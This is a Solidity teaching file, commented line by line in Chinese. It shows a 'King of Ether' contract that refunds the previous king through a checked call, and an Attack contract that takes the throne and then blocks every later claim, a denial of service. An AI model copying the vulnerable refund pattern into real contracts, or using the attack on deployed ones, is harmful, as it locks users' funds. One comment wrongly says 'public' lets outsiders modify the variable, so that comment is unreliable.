// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingofEth{

    address public king; //定义了一个公共变量 king，用来存储当前以太之王的地址。public 使得这个变量可以在合约外部访问和修改。
    uint public balance; //定义了一个公共变量 balance，用来跟踪当前以太之王支付的最高金额。 

    function claimThrone() external payable{ //定义了一个名为 claimThrone 的函数，external 表示这个函数只能被外部调用，payable 表示这个函数可以接收以太币。
    require(msg.value > balance, "You need to pay more to become the king"); //require 是一个安全检查，确保参与者支付的金额 (msg.value) 大于当前的 balance。
    //如果不满足这个条件，交易会被撤销，并显示错误信息 "You need to pay more to become the king"。


    (bool sent, ) = king.call{value: balance}(""); //使用 call 方法尝试将 balance 金额的以太币发送给当前的 king 地址。call 方法返回一个布尔值 sent，表示操作是否成功。
    require(sent, "Failed to send Ether"); //再次使用 require 来检查 call 方法是否成功。如果发送失败，交易会被撤销，并显示错误信息 "Failed to send Ether"。 
    
    balance = msg.value; //更新 balance 为参与者支付的新金额。 
    king = msg.sender; //更新 king 为当前发送交易的地址，即新的以太之王。 
    }
}


contract Attack {


    KingofEth kingofether; //定义了一个名为 kingofether 的状态变量，用来存储 KingofEth 合约的实例，以便 Attack 合约可以与其交互。

    constructor(KingofEth _kingofether) payable { //定义了一个构造函数，它接受一个 KingofEth 类型的参数 _kingofether，并标记为 payable，意味着在部署 Attack 合约时可以发送以太币。


        kingofether = KingofEth(_kingofether); //在构造函数中初始化 kingofether 变量，将其设置为传入的 KingofEth 合约的地址。

    }


    function attack() public payable{ // 定义了一个名为 attack 的函数，public 表示这个函数可以被外部调用，payable 表示这个函数可以接收以太币。
        kingofether.claimThrone{value: msg.value}(); //调用 kingofether 合约的 claimThrone 函数，并传递 msg.value 金额的以太币。{value: msg.value} 是一个特殊的语法，用于指定发送的以太币金额。

    }
}
